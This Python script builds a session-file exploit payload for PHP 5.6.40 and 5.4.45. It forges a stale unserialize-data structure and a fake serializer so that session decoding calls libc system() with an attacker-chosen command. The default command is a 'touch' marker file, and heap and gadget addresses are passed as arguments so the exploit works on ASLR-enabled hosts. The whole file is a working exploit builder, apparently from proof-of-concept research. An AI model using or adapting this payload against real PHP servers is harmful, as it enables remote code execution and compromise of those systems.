#!/usr/bin/env python3
"""Build the 5.6.40 / 5.4.45 native two-record payload with explicit geometry.

Same chain as phase/make_native56.py, but all addresses are arguments so it
can be used on an ASLR-on worker (heap randomised, binary non-PIE):

  * P (stale php_unserialize_data) at X1+poff
  * fake serializer F1 = f1 (normally X2+0x300); fields are written at the
    payload's own 0x300/0x308/0x310, because the second s_read reloads the
    same file into X2
  * survival gadget / encode pointer and decode (= libc system) are arguments

For the measurement run set --f1 X1+0x300 and --decode 0x4af399: the first
decode corrupts the X1 copy with Z_ADDREF, but gdb hits php_session_decode
for the second (X2) buffer before the fake pointer is used.
"""
import argparse, struct

PS_SERIALIZER = 0x82E5C0
U1 = 0x200
U2 = 0x220
LSTR = 973
FILESIZE = 0x400


def build(marker, x1, poff, f1, encode_addr, decode_addr, doff=0x380,
          ps_serializer=PS_SERIALIZER):
    core = ("touch %s #" % marker).encode()
    if len(core) > 32:
        raise SystemExit("marker command too long: %d bytes" % len(core))
    key = b" " * (32 - len(core)) + core

    rec1 = bytes([32]) + key + b"R:1057;"
    assert len(rec1) == 0x28
    hdr = ("s:%d:\"" % LSTR).encode()
    off = len(rec1)
    payload_start = off + 2 + len(hdr)
    assert payload_start + LSTR + 2 == FILESIZE

    buf = bytearray(b"A" * FILESIZE)
    buf[0:len(rec1)] = rec1
    buf[off] = 1
    buf[off + 1] = ord("z")
    buf[off + 2:off + 2 + len(hdr)] = hdr
    buf[payload_start + LSTR:payload_start + LSTR + 2] = b"\";"

    def putq(o, v):
        buf[o:o + 8] = struct.pack("<Q", v & ((1 << 64) - 1))

    first = x1 + U1 - 0x2000
    last = x1 + U2 - 0x2000
    last_dtor = x1 + doff - 0x2000
    k0 = (ps_serializer - last_dtor) // 8 - 1

    putq(poff + 0x00, first)
    putq(poff + 0x08, last)
    putq(poff + 0x10, 0)
    putq(poff + 0x18, last_dtor)
    putq(U1, 0x1000)
    putq(U2, 0)
    putq(doff, k0)
    putq(0x300, f1)
    putq(0x308, encode_addr)
    putq(0x310, decode_addr)

    info = dict(x1=x1, p=x1 + poff, f1=f1, last_dtor=last_dtor, k0=k0,
                encode=encode_addr, decode=decode_addr)
    return bytes(buf), info


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--marker", default="/tmp/php5_aslr_native")
    ap.add_argument("--x1", type=lambda s: int(s, 0), required=True)
    ap.add_argument("--poff", type=lambda s: int(s, 0), required=True)
    ap.add_argument("--f1", type=lambda s: int(s, 0), required=True)
    ap.add_argument("--encode", type=lambda s: int(s, 0), default=0x4B4728)
    ap.add_argument("--decode", type=lambda s: int(s, 0), default=0x7FFFF7D1C090)
    ap.add_argument("--doff", type=lambda s: int(s, 0), default=0x380)
    ap.add_argument("--ps", type=lambda s: int(s, 0), default=PS_SERIALIZER)
    a = ap.parse_args()
    payload, info = build(a.marker, a.x1, a.poff, a.f1, a.encode, a.decode,
                          a.doff, a.ps)
    open(a.out, "wb").write(payload)
    print("wrote %s (%d bytes)" % (a.out, len(payload)))
    for k in ("x1", "p", "f1", "last_dtor", "k0", "encode", "decode"):
        print("  %-10s 0x%x" % (k, info[k] & ((1 << 64) - 1)))
